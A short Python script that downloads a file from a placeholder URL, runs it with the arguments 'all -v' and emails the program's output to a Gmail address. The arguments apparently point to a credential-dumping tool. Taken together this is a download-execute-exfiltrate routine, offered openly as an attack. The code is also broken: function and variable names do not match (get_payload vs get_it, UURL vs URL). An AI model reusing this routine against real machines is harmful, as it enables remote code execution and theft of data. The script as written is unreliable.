#!/usr/bin/env python
import subprocess
import smtplib
import requests

def get_payload():
        get_request = requests.get(url)
        print(get_request.content)
        name = url.split("/")[-1]
        with open(name, "wb") as payload:
            payload.write(get_request.content)

def execute(prgm):
    process = subprocess.Popen([prgm, 'all', '-v'], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
    result, error = process.communicate()
    try:
        return result.decode('latin-1').encode("utf-8")
    except:
        return str(result)

def mail_it(email, passwd, to_mail, msg):
    mailserver = smtplib.SMTP("smtp.gmail.com", 587)
    mailserver.starttls()
    mailserver.login(email, passwd)
    mailserver.sendmail(email, to_mail, msg)
    mailserver.quit()

UURL = "XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX"
file_name = URL.split("/")[-1]

get_it(URL)
message = execute(file_name)
mail_it("xxxxxxxxxx@gmail.com", "********", "xxxxxxxxxx.com", message)
